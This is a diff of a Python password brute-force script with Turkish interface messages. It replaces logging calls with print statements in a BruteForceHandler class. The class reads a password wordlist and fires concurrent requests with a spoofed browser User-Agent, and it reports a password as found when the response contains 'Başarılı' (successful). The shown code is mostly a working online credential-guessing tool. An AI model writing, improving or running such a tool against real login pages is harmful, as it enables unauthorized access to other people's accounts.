@@ -3,7 +3,6 @@ from concurrent.futures import ThreadPoolExecutor
 import time
 import sys
 from typing import Optional
-import logging
 from requests.exceptions import RequestException
 
 class BruteForceHandler:
@@ -16,19 +15,13 @@ class BruteForceHandler:
         self.found_password = None
         self.attempts = 0
         self.start_time = None
-        
-        logging.basicConfig(
-            level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s'
-        )
-        self.logger = logging.getLogger(__name__)
 
     def try_password(self, password: str) -> Optional[str]:
         try:
             self.attempts += 1
             password = password.strip()
             
-            self.logger.debug(f"Deneniyor: {password}")
+            print(f"Deneniyor: {password}")
             
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -44,13 +37,13 @@ class BruteForceHandler:
             
             if response.status_code == 200 and "Başarılı" in response.text:
                 self.found_password = password
-                self.logger.info(f"Şifre bulundu: {password}")
+                print(f"Şifre bulundu: {password}")
                 return password
                 
         except RequestException as e:
-            self.logger.error(f"Bağlantı hatası: {str(e)}")
+            print(f"Bağlantı hatası: {str(e)}")
         except Exception as e:
-            self.logger.error(f"Beklenmeyen hata: {str(e)}")
+            print(f"Beklenmeyen hata: {str(e)}")
         
         return None
 
@@ -59,30 +52,30 @@ class BruteForceHandler:
             with open(self.password_list, 'r', encoding='utf-8') as file:
                 return [line.strip() for line in file if line.strip()]
         except FileNotFoundError:
-            self.logger.error(f"Şifre listesi bulunamadı: {self.password_list}")
+            print(f"Şifre listesi bulunamadı: {self.password_list}")
             sys.exit(1)
         except Exception as e:
-            self.logger.error(f"Dosya okuma hatası: {str(e)}")
+            print(f"Dosya okuma hatası: {str(e)}")
             sys.exit(1)
 
     def run(self) -> Optional[str]:
         self.start_time = time.time()
         passwords = self.load_passwords()
         
-        self.logger.info(f"Toplam {len(passwords)} şifre test edilecek")
-        self.logger.info("Brute force işlemi başlatılıyor...")
+        print(f"Toplam {len(passwords)} şifre test edilecek")
+        print("Brute force işlemi başlatılıyor...")
 
         try:
             with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                 executor.map(self.try_password, passwords)
                 
         except KeyboardInterrupt:
-            self.logger.warning("\nİşlem kullanıcı tarafından durduruldu!")
+            print("\nİşlem kullanıcı tarafından durduruldu!")
         finally:
             duration = time.time() - self.start_time
-            self.logger.info(f"Toplam deneme: {self.attempts}")
-            self.logger.info(f"Geçen süre: {duration:.2f} saniye")
-            self.logger.info(f"Hız: {self.attempts/duration:.2f} deneme/saniye")
+            print(f"Toplam deneme: {self.attempts}")
+            print(f"Geçen süre: {duration:.2f} saniye")
+            print(f"Hız: {self.attempts/duration:.2f} deneme/saniye")
         
         return self.found_password
 
@@ -108,7 +101,6 @@ def get_user_input() -> tuple:
     while True:
         password_list = input("\nŞifre listesi dosyasının yolu: ").strip()
         if password_list:
-            # Dosyanın varlığını kontrol et
             try:
                 with open(password_list, 'r', encoding='utf-8') as f:
                     if sum(1 for _ in f) > 0:
